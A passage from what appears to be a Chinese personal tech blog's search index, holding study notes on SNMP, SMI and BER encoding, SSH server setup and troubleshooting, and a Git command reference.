start="4"><li>SMI中的基本数据类型</li></ol><p>3种在ASN.1中定义的简单数据类型+4种SM|中定义的数据类型</p><blockquote><ul><li>Integers-有符号整数，范围：-2,147,483,648 to 2,147,483,647.</li><li>Octet strings-字符串（每位字符编码在0到65535)</li><li>Object IDs -These values are from the set of all object identifiers allocated according to the rules specified inASN.1.实际上就是之前将的OID，OID也是应该数据结构</li></ul></blockquote><blockquote><ul><li>Network addresses-网络地址代表一个特性协议族的地址.SNMPv1支持32为1P地址</li><li>Counters-计数器值非负，可以增加一直到一个最大值，再增加到0.SNMPv1中，指定为32位计数器</li><li>Gauges          -Gauges非负，可以增加或者减少，但是保持一个它曾经到达过的最大值</li><li>Time ticks-time tick代表从某个时间开始多少时间，以10ms为单位.</li></ul></blockquote><ol start="5"><li><strong>被管理对象</strong>的类型（对象！！不同于基本数据类型）</li></ol><p>简单类型：<strong>标量对象</strong>(注意这是一个对象)</p><ul><li>定义一个单个对象实例（类似于：C中的变量)</li></ul><blockquote><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208191054572.png" alt="image-20220819105443427" style="zoom:50%;" /></blockquote><ul><li>SMI的基本数据类型</li></ul><blockquote><ul><li>Integer(4 bytes),来自ANS.1</li><li>String(var iable),来自ANS.1</li><li>Objectldentifier (variable)来自ANS.1</li><li>IPAddress(4 bytes),SMI增加</li><li>Counter(4 bytes),SMl增加</li><li>Gauge(4 bytes),SMl增加</li><li>TimeTicks(4 bytes),SMl增加</li></ul></blockquote><p>结构类型：</p><ul><li>简单类型和某些结构类型的组合</li><li>SMI定义了2种类型：sequence和sequence of</li><li>Sequence:1个sequence:数据类型是一些简单数据类型的组合(c.f.C中的结构体)(不同类型组合成结构体)</li><li>Sequence of:1个sequence of数据类型是简单类型的序列(c.f.C中的数组)（相同类型组合成数组）</li></ul><h4 id="传输编码：BER"><a href="#传输编码：BER" class="headerlink" title="传输编码：BER"></a>传输编码：BER</h4><p>SMI采用BER(Basic Encoding Rules)将SMI定义的被管对象值编码成传输的位串。定义编码从而在网络上进行传输的方法，形成什么样的码流以至于机器无关，语义相同</p><p>使得不同机器获得语义上的一致性</p><ul><li>仅仅内存拷贝解决不了通信问题</li><li>大端小端问题</li></ul><p>每个被传输的数据（对象值和SNMP字段）都有：TLV</p><ul><li>Type(1byte) - 3子字段</li></ul><blockquote><p>class (2 bit) + format (1 bit) + number (5 bit)</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208191248829.png" alt="image-20220819124856688" style="zoom:50%;" /></blockquote><ul><li>Length:1个或多个字节</li></ul><blockquote><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208191249312.png" alt="image-20220819124941159" style="zoom:50%;" /></blockquote><ul><li>Value:根据BER定义的规则编码数据的值</li></ul><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208191255772.png" alt="image-20220819125503640"></p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208191257370.png" alt="image-20220819125701241"></p><h3 id="SNMP-互联网网络管理协议"><a href="#SNMP-互联网网络管理协议" class="headerlink" title="SNMP:互联网网络管理协议"></a>SNMP:互联网网络管理协议</h3><h4 id="网络管理协议"><a href="#网络管理协议" class="headerlink" title="网络管理协议"></a>网络管理协议</h4><p>网络管理，是指网络管理员通过网络管理程序对网络上的资源进行集中化管理的操作。网络管理系统中最重要的部分就是网络管理协议，它定义了网络管理器与被管代理间的通信方法。</p><p>在网络管理协议产生以前的相当长的时间里，管理者要学习各种从不同网络设备获取数据的方法。因为各个生产厂家使用专用的方法收集数据，相同功能的设备，不同的生产厂商提供的数据采集方法可能大相径庭。在这种情况下，制定一个行业标准的紧迫性越来越明显。</p><h4 id="SNMP"><a href="#SNMP" class="headerlink" title="SNMP"></a>SNMP</h4><p>简单网络管理协议(SNMP)已经成为事实上的标准网络管理协议。由于SNMP首先是IETF的研究小组为了解决在Internet上的路由器管理问题提出的，因此许多人认为SNMP在IP上运行的原因是Internet运行的是TCP&#x2F;IP协议，但事实上，SNMP是被设计成与协议无关的，所以它可以在IP、IPX、AppleTalk、OSI以及其他用到的传输协议上使用。</p><p>SNMP是由一系列协议组和规范组成的，它们提供了一种从网络上的设备中收集网络管理信息的方法。</p><p>从被管理设备中收集数据有两种方法：一种是轮询(polling-only)方法，另一种是基于中断(interrupt-based)的方法。</p><blockquote><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208191302625.png" alt="image-20220819130214477" style="zoom:50%;" /></blockquote><h5 id="轮询-polling-only"><a href="#轮询-polling-only" class="headerlink" title="轮询(polling-only)"></a>轮询(polling-only)</h5><p>SNMP使用嵌入到网络设施中的代理软件来收集网络的通信信息和有关网络设备的统计数据。代理软件不断地收集统计数据，并把这些数据记录到一个管理信息库(MIB)中。网管员通过向代理的MIB发出查询信号可以得到这些信息，这个过程就叫轮询(polling)。为了能全面地查看一天的通信流量和变化率，管理人员必须不断地轮询SNMP代理，每分钟就轮询一次。这样，网管员可以使用SNMP来评价网络的运行状况，并揭示出通信的趋势，如哪一个网段接近通信负载的最大能力或正使通信出错等。先进的SNMP网管站甚至可以通过编程来自动关闭端口或采取其它矫正措施来处理历史的网络数据。</p><p>如果只是用轮询的方法，那么网络管理工作站总是在控制之下。但这种方法的缺陷在于信息的实时性，尤其是错误的实时性。多久轮询一次、轮询时选择什么样的设备顺序都会对轮询的结果产生影响。轮询的间隔太小，会产生太多不必要的通信量;间隔太大，而且轮询时顺序不对，那么关于一些大的灾难性事件的通知又会太慢，就违背了积极主动的网络管理目的。</p><h5 id="中断-interrupt-based"><a href="#中断-interrupt-based" class="headerlink" title="中断(interrupt-based)"></a>中断(interrupt-based)</h5><p>与之相比，当有异常事件发生时，基于中断的方法可以立即通知网络管理工作站，实时性很强。但这种方法也有缺陷。产生错误或自陷需要系统资源。如果自陷必须转发大量的信息，那么被管理设备可能不得不消耗更多的事件和系统资源来产生自陷，这将会影响到网络管理的主要功能。</p><p>结果，以上两种方法的结合：面向自陷的轮询方法(trap-directed polling)可能是执行网络管理最有效的方法了。一般来说，网络管理工作站轮询在被管理设备中的代理来收集数据，并且在控制台上用数字或图形的表示方法来显示这些数据。被管理设备中的代理可以在任何时候向网络管理工作站报告错误情况，而并不需要等到管理工作站为获得这些错误情况而轮询它的时候才会报告。</p><h4 id="结构"><a href="#结构" class="headerlink" title="结构"></a>结构</h4><p>SNMP的体系结构分为SNMP管理者(SNMP Manager)和SNMP代理者(SNMP Agent)，每一个支持SNMP的网络设备中都包含一个代理，此代理随时纪录网络设备的各种情况，网络管理程序再通过SNMP通信协议查询或修改代理所纪录的信息。</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208181807013.jpeg" alt="img" style="zoom: 67%;" /><h4 id="SNMP报文类型"><a href="#SNMP报文类型" class="headerlink" title="SNMP报文类型"></a>SNMP报文类型</h4><blockquote><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208191303735.png" alt="image-20220819130350603" style="zoom:50%;" /></blockquote><h4 id="SNMP工作方式"><a href="#SNMP工作方式" class="headerlink" title="SNMP工作方式"></a>SNMP工作方式</h4><p>两者之间是松耦合的关系，使用UDP协议进行通讯，默认端口是UDP161(也会用到162端口接收trap数据)</p><p>SNMP管理站通过向SNMP代理发送请求命令（GetRequest, GetNextRequest, GetBulkRequest或InformRequest），当SNMP代理收到命令后返回响应（Response）</p><p>SNMP管理站向SNMP代理发送SetRequest，代理设备执行设置操作。</p><p>SNMP代理发生特定重要状况改变时主动向SNMP管理站发送Trap消息。</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208182355091.jpeg" alt="img" style="zoom:67%;" /><h4 id="SNMP报文格式"><a href="#SNMP报文格式" class="headerlink" title="SNMP报文格式"></a>SNMP报文格式</h4><blockquote><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208191312531.png" alt="image-20220819131242400" style="zoom:67%;" /><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208191551496.png" alt="image-20220819155110379" style="zoom:50%;" /><p>注意：SNMP协议没有给出每个字段的长度，因为使用了TLV方式~，所以不需要给出。TLV自解释</p></blockquote><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208191555397.png" alt="image-20220819155523260" style="zoom:50%;" /><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208191557873.png" alt="image-20220819155707700" style="zoom: 50%;" /><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208191605613.png" alt="image-20220819160502485" style="zoom:50%;" /><h4 id="SNMP编码"><a href="#SNMP编码" class="headerlink" title="SNMP编码"></a>SNMP编码</h4><blockquote><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208191607981.png" alt="image-20220819160722832" style="zoom:50%;" /></blockquote><h4 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h4><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208191610514.png" alt="image-20220819161035389"></p><p>在第三节的第26分钟解释，豁然开朗~~！<img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208191616105.png" alt="image-20220819161610865"></p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208191644250.png" alt="image-20220819164443105"></p><h3 id="安全性"><a href="#安全性" class="headerlink" title="安全性"></a>安全性</h3><p>在SNMPv3中增加了以下安全特性：</p><ul><li>报文完整性：保证报文在传输中不被修改</li><li>可认证性：能够判断报文是不是一个有效的源发送的</li><li>加密：保证私密性，即使被截获无法得知发送的到底是什么</li><li>基于视图的访肉控制：</li></ul><blockquote><ul><li>SNMP实体维护着不同用户的访问权限，策略的数据库</li><li>是否可访问的LCD数据库可以作为被管对象访问</li></ul></blockquote><h1 id="refer"><a href="#refer" class="headerlink" title="refer"></a>refer</h1><blockquote><p><a href="https://www.bilibili.com/video/BV1TL4y1B7LJ?spm_id_from=333.337.search-card.all.click&vd_source=e73a152dada4626bad49c30d848902f7">中科大-郑烇-计算机网络-网络管理（3&#x2F;3）-数据定义语言ASN.1、BER编码和SNMP协议</a></p><p><a href="https://product.pconline.com.cn/itbk/life/electronic/1802/10848758.html">网络管理协议是什么 各种网络管理协议特点介绍【详解】</a></p><p><a href="https://www.bilibili.com/video/BV1PY4y1s7cD?spm_id_from=333.337.search-card.all.click&vd_source=e73a152dada4626bad49c30d848902f7">SNMP操作演示</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 计算机网络 </category>
          
          <category> 应用层 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络管理 </tag>
            
            <tag> SNMP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSH</title>
      <link href="/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%B7%A5%E5%85%B7+%E7%8E%AF%E5%A2%83/SSH.html"/>
      <url>/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%B7%A5%E5%85%B7+%E7%8E%AF%E5%A2%83/SSH.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="SSH登录"><a href="#SSH登录" class="headerlink" title="SSH登录"></a>SSH登录</h1><p>SSH简介：SSH 为 Secure Shell 的缩写，SSH 为建立在应用层基础上的安全协议。SSH 是较可靠，专为远程登录会话和其他网络服务提供安全性的协议。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#SSH配置：开启密码登录、允许root用户登录：</span></span><br><span class="line">vim /etc/ssh/sshd_config</span><br><span class="line"><span class="comment">#PermitRootLogin prohibit-password</span></span><br><span class="line">PermitRootLogin <span class="built_in">yes</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#开启或重启ssh：（改完配置文件都要重启相应服务）</span></span><br><span class="line">service ssh start</span><br><span class="line">service ssh restart</span><br><span class="line">systemctl status ssh<span class="comment">#命令查看ssh状态</span></span><br><span class="line">systemctl start ssh<span class="comment">#开启ssh服务</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#查看22端口是否开启监听：</span></span><br><span class="line">netstat -anltup | grep 22</span><br><span class="line"></span><br><span class="line"><span class="comment">#添加开机启动：</span></span><br><span class="line">systemctl <span class="built_in">enable</span> ssh</span><br><span class="line">update-rc.d ssh <span class="built_in">enable</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#终端连接：</span></span><br><span class="line">ifconfig</span><br><span class="line">ssh root@192.168.123.136</span><br></pre></td></tr></table></figure><h1 id="ssh连接centos-很慢-解决方法"><a href="#ssh连接centos-很慢-解决方法" class="headerlink" title="ssh连接centos 很慢-解决方法"></a>ssh连接centos 很慢-解决方法</h1><blockquote><p>参考：<a href="https://www.runoob.com/w3cnote/ssh-slow.html">https://www.runoob.com/w3cnote/ssh-slow.html</a></p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#先备份/etc/ssh/sshd_config,备份命令为</span></span><br><span class="line"><span class="built_in">cp</span> /etc/ssh/sshd_config /etc/ssh/sshd_config.bak</span><br><span class="line"><span class="comment">#以root用户登录</span></span><br><span class="line"><span class="comment">#编辑配置文件</span></span><br><span class="line">vi /etc/ssh/sshd_config  </span><br><span class="line"><span class="comment">#输入 / ,查找GSSAPIAuthentication 其值改为no</span></span><br><span class="line"><span class="comment">#输入 /，查找UseDNS,其值改为no(该项默认不启用，去掉#启用)</span></span><br><span class="line"><span class="comment">#最后输入!wq保存文件并退出</span></span><br><span class="line"><span class="comment">#重启</span></span><br><span class="line">systemctl restart sshd</span><br></pre></td></tr></table></figure><h1 id="关于known-hosts文件"><a href="#关于known-hosts文件" class="headerlink" title="关于known_hosts文件:"></a>关于<strong>known_hosts</strong>文件:</h1><blockquote><p>用户的.ssh目录下面有有个<strong>known_hosts</strong>文件，这个文件存储本机曾经ssh连接过的远程主机的公钥，用来在连接时和对面主机上的公钥进行比对，如果一样则进行下一步操作！</p><p>ssh会把你每个你访问过计算机的公钥(public key)都记录在known_hosts。当下次访问相同计算机时，OpenSSH会核对公钥。如果公钥不同，OpenSSH会发出警告， 避免你受到DNS Hijack之类的攻击。</p><p>参考：<a href="https://www.cnblogs.com/fonxian/p/11228760.html">https://www.cnblogs.com/fonxian/p/11228760.html</a></p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208282147744.png" alt="image-20220827205707043" style="zoom:50%;" /></blockquote><h1 id="refer"><a href="#refer" class="headerlink" title="refer"></a>refer</h1><blockquote><ul><li><a href="https://www.wangdoc.com/ssh/">SSH 教程</a></li><li><a href="https://www.wangdoc.com/ssh/key.html">https://www.wangdoc.com/ssh/key.html</a></li></ul></blockquote>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 工具+环境 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SSH </tag>
            
            <tag> ssh连接centos很慢 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Git</title>
      <link href="/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%B7%A5%E5%85%B7+%E7%8E%AF%E5%A2%83/Git.html"/>
      <url>/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%B7%A5%E5%85%B7+%E7%8E%AF%E5%A2%83/Git.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>Git简介：一个开源的分布式版本控制系，用于敏捷高效地处理任何或小或大的项目。</p><h1 id="git命令速查"><a href="#git命令速查" class="headerlink" title="git命令速查"></a>git命令速查</h1><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209212217844.png" alt="git命令速查"></p><h1 id="工作区、暂存区、版本库"><a href="#工作区、暂存区、版本库" class="headerlink" title="工作区、暂存区、版本库"></a>工作区、暂存区、版本库</h1><ul><li>工作区：就是你在电脑里能看到的目录。</li><li>暂存区：英文叫 stage 或 index。一般存放在 .git 目录下的 index 文件（.git&#x2F;index）中，所以我们把暂存区有时也叫作索引（index）。</li><li>版本库：工作区有一个隐藏目录 .git，这个不算工作区，而是 Git 的版本库。</li></ul><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209212221053.png" alt="在这里插入图片描述" style="zoom:50%;" /><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209212222370.png" alt="在这里插入图片描述" style="zoom:50%;" /><h1 id="Git命令"><a href="#Git命令" class="headerlink" title="Git命令"></a>Git命令</h1><h2 id="简单的代码提交流程"><a href="#简单的代码提交流程" class="headerlink" title="简单的代码提交流程"></a>简单的代码提交流程</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git status #查看工作区代码相对于暂存区的差别</span><br><span class="line">git add . #将当前目录下修改的所有代码从工作区添加到暂存区 . 代表当前目录</span><br><span class="line">git commit -m ‘注释’ #将缓存区内容添加到本地仓库</span><br><span class="line">git push origin master #将本地版本库推送到远程服务器，origin是远程主机，master表示是远程服务器上的master分支，分支名是可以修改的</span><br></pre></td></tr></table></figure><h3 id="Git-add"><a href="#Git-add" class="headerlink" title="Git add"></a>Git add</h3><p><code>git add \[参数] &lt;路径&gt;</code>　作用就是将我们需要提交的代码从工作区添加到暂存区，就是告诉git系统，我们要提交哪些文件，之后就可以使用git commit命令进行提交了。</p><blockquote><p>为了方便下面都用 . 来标识路径， . 表示当前目录，路径可以修改，下列操作的作用范围都在版本库之内。</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git add .</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">不加参数默认为将修改操作的文件和未跟踪新添加的文件添加到git系统的暂存区，注意不包括删除</span></span><br><span class="line"></span><br><span class="line">git add -u .</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">-u 表示将已跟踪文件中的修改和删除的文件添加到暂存区，不包括新增加的文件，注意这些被删除的文件被加入到暂存区再被提交并推送到服务器的版本库之后这个文件就会从git系统中消失了。</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">git add -A .</span></span><br><span class="line">\A 表示将所有的已跟踪的文件的修改与删除和新增的未跟踪的文件都添加到暂存区。</span><br></pre></td></tr></table></figure><h3 id="Git-commit"><a href="#Git-commit" class="headerlink" title="Git commit"></a>Git commit</h3><p><code>git commit</code> 主要是将暂存区里的改动给提交到本地的版本库。每次使用git commit 命令我们都会在本地版本库生成一个40位的哈希值，这个哈希值也叫commit-id，<br>commit-id 在版本回退的时候是非常有用的，它相当于一个快照,可以在未来的任何时候通过与git reset的组合命令回到这里.</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git commit -m ‘message’</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">-m 参数表示可以直接输入后面的“message”，如果不加 -m参数，那么是不能直接输入message的，而是会调用一个编辑器一般是vim来让你输入这个message，message即是我们用来简要说明这次提交的语句。</span></span><br><span class="line"></span><br><span class="line">git commit -am ‘message’ -am等同于-a -m</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">-a参数可以将所有已跟踪文件中的执行修改或删除操作的文件都提交到本地仓库，即使它们没有经过git add添加到暂存区，</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">注意: 新加的文件（即没有被git系统管理的文件）是不能被提交到本地仓库的。</span></span><br></pre></td></tr></table></figure><h3 id="Git-push"><a href="#Git-push" class="headerlink" title="Git push"></a>Git push</h3><p>在使用git commit命令将修改从暂存区提交到本地版本库后，只剩下最后一步将本地版本库的分支推送到远程服务器上对应的分支了。<br>git push的一般形式为 <code>git push &lt;远程主机名&gt; &lt;本地分支名&gt; &lt;远程分支名&gt;</code> ，例如 <code>git push origin master：refs/for/master</code> ，即是将本地的master分支推送到远程主机origin上的对应master分支， origin 是远程主机名。第一个master是本地分支名，第二个master是远程分支名。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git push origin master</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">如果远程分支被省略，如上则表示将本地分支推送到与之存在追踪关系的远程分支（通常两者同名），如果该远程分支不存在，则会被新建</span></span><br><span class="line"></span><br><span class="line">git push origin ：refs/for/master</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">如果省略本地分支名，则表示删除指定的远程分支，因为这等同于推送一个空的本地分支到远程分支，等同于 git push origin --delete master</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">关于 refs/for：</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">refs/for 的意义在于我们提交代码到服务器之后是需要经过code review 之后才能进行merge的，而refs/heads 不需要</span></span><br><span class="line"></span><br><span class="line">git push origin</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">如果当前分支与远程分支存在追踪关系，则本地分支和远程分支都可以省略，将当前分支推送到origin主机的对应分支</span></span><br><span class="line"></span><br><span class="line">git push</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">如果当前分支只有一个远程分支，那么主机名都可以省略，形如 git push，可以使用git branch -r ，查看远程的分支名</span></span><br></pre></td></tr></table></figure><h3 id="综述"><a href="#综述" class="headerlink" title="综述"></a>综述</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">克隆</span></span><br><span class="line">git clone http://xxx</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">拉取</span></span><br><span class="line">git pull http://xxx</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">添加</span></span><br><span class="line">git add xxx</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">描述信息</span></span><br><span class="line">git commit -m &quot;提交&quot;</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">推送到远程</span></span><br><span class="line">git push origin master</span><br></pre></td></tr></table></figure><h2 id="pull拉取最新代码"><a href="#pull拉取最新代码" class="headerlink" title="pull拉取最新代码"></a>pull拉取最新代码</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">本地仓库的代码还未被更新，此时：</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">更新远程仓库的代码为最新的</span></span><br><span class="line">git fetch --all</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">让本地代码与origin / master完全相同</span></span><br><span class="line">git reset --hard origin/master</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">git pull拉取远程代码</span></span><br><span class="line">git pull origin master</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">git merge将暂存区代码更新到本地工作区</span></span><br><span class="line">git merge master</span><br></pre></td></tr></table></figure><h2 id="拉取代码，解决冲突"><a href="#拉取代码，解决冲突" class="headerlink" title="拉取代码，解决冲突"></a>拉取代码，解决冲突</h2><p>场景：公司已创建有仓库，需要拉取最新代码并上传自己的代码。</p><h3 id="拉取仓库代码"><a href="#拉取仓库代码" class="headerlink" title="拉取仓库代码"></a><strong>拉取仓库代码</strong></h3><p>（拉取时有冲突需要先解决冲突再拉取，或者先保存本地代码再提交）</p><blockquote><p><a href="https://blog.csdn.net/londa/article/details/109482251">git 临时保存代码方法</a></p></blockquote><h2 id="git-关联-x2F-创建仓库并上传代码"><a href="#git-关联-x2F-创建仓库并上传代码" class="headerlink" title="git 关联&#x2F;创建仓库并上传代码"></a>git 关联&#x2F;创建仓库并上传代码</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">Git全局设置：</span></span><br><span class="line">git config --global user.name &quot;yusong&quot;</span><br><span class="line">git config --global user.email &quot;1195754621@qq.com&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">创建 git 仓库：</span></span><br><span class="line">mkdir vuestart</span><br><span class="line">cd vuestart</span><br><span class="line">git init </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">#输入git init（初始化当前目录，即创建Git仓库。)你可以在目录下看到一个.git文件夹</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">#按照流程输入用户名和邮箱名名字可以随便取，注意要有空格，少了空格会提示重新输入</span></span></span><br><span class="line">touch README.md</span><br><span class="line">git add README.md</span><br><span class="line">git commit -m &quot;first commit&quot;</span><br><span class="line">git remote add origin https://gitee.com/xxx/xxx.git</span><br><span class="line">git push -u origin &quot;master&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">已有仓库?</span></span><br><span class="line">cd existing_git_repo</span><br><span class="line">git remote add origin https://gitee.com/xxx/xxx.git</span><br><span class="line">git push -u origin &quot;master&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看关联的仓库</span></span><br><span class="line">git remote -v</span><br></pre></td></tr></table></figure><h2 id="关联已有仓库并提交代码"><a href="#关联已有仓库并提交代码" class="headerlink" title="关联已有仓库并提交代码"></a>关联已有仓库并提交代码</h2><p>第一步：找到适合位置，右键打开git工具</p><p>第二步：克隆或拉取代码</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone http://xxx.git</span><br><span class="line">git pull http://xxx.git</span><br></pre></td></tr></table></figure><p>第三步：创建和切换分支</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1.【git branch】查看一下本地分支，再【git branch -a】查看一下远程分支，对比下，远程存在哪些本地没有的新分支.</span><br><span class="line">2.将某个远程主机的更新，全部取回本地：【git fetch】</span><br><span class="line">3.再次查看远程分支：【git branch -a】 发现远程的分支已经可以看见了</span><br><span class="line">4.拉取远程分支到本地：</span><br><span class="line">创建远程分支并切换到该分支:【git checkout -b (远程分支名)】 </span><br><span class="line">拉取远程分支代码到本地分支：【git pull origin (远程分支名称)]</span><br></pre></td></tr></table></figure><p>第四三步：将要上传的代码拷贝到当前目录下</p><p>第五步：上传并提交代码</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git add xxx/</span><br><span class="line">git commit -m &quot;init-1.0&quot;</span><br><span class="line">git push origin feature</span><br></pre></td></tr></table></figure><h2 id="其他命令："><a href="#其他命令：" class="headerlink" title="其他命令："></a>其他命令：</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git branch -r  #查看远程所有分支</span><br><span class="line">git branch #查看本地所有分支</span><br><span class="line">git branch -a #查看本地及远程的所有分支</span><br><span class="line">git fetch  #将某个远程主机的更新，全部取回本地</span><br><span class="line">git remote -v #查看仓库关联情况</span><br><span class="line">git status #查看git状态</span><br></pre></td></tr></table></figure><h2 id="git记住某个仓库的账号密码"><a href="#git记住某个仓库的账号密码" class="headerlink" title="git记住某个仓库的账号密码"></a>git记住某个仓库的账号密码</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git config credential.helper store</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">这里没有–global意思是指只对这个仓库生效，建议以后都不要加–global，让代码配置以仓库为单位存储就好，设置成全局不灵活。</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">然后git push 到远程仓库，按提示输入用户名和密码，注意要输入正确的（GitHub的用户名和密码）</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">这样，下次就不用再输入账号和密码了。</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">若想把项目记住的用户名和密码删掉，输入下列命令：</span></span><br><span class="line">git credential-manager uninstall</span><br></pre></td></tr></table></figure><h2 id="Git-socks代理"><a href="#Git-socks代理" class="headerlink" title="Git socks代理"></a>Git socks代理</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">前提是你本地有 socks5 代理，本地socks开启局域网连接</span></span><br><span class="line">git config --global http.proxy &#x27;socks5://127.0.0.1:1080&#x27;</span><br><span class="line">git config --global https.proxy &#x27;socks5://127.0.0.1:1080&#x27;</span><br><span class="line">git clone https://github.com/shmilylty/OneForAll.git</span><br></pre></td></tr></table></figure><h1 id="refer"><a href="#refer" class="headerlink" title="refer"></a>refer</h1><blockquote><ul><li><a href="https://www.runoob.com/git/git-tutorial.html">Git教程</a></li><li><a href="https://www.cnblogs.com/kumata/p/9061166.html">Git：从github上克隆、修改和更新项目</a></li><li><a href="https://www.runoob.com/git/git-pull.html">git pull语法(重要）</a></li><li><a href="https://www.cnblogs.com/gdjlc/p/12088872.html">最详细的git Windows的教程和git使用方法</a></li><li><a href="https://blog.csdn.net/justidle/article/details/108768730">Git 命令行使用</a></li><li><a href="https://www.bilibili.com/video/BV12K4y1a7AH/?from=search&seid=4045120365387477075&spm_id_from=333.337.0.0&vd_source=e73a152dada4626bad49c30d848902f7">B站关于 Git 命令使用最简单而且最详细讲解</a></li><li><a href="https://blog.csdn.net/weixin_38088097/article/details/106680130?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522164213532216780261932394%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=164213532216780261932394&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_click~default-2-106680130.pc_search_insert_es_download&utm_term=git%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4&spm=1018.2226.3001.4187">git常用命令总结</a></li><li><a 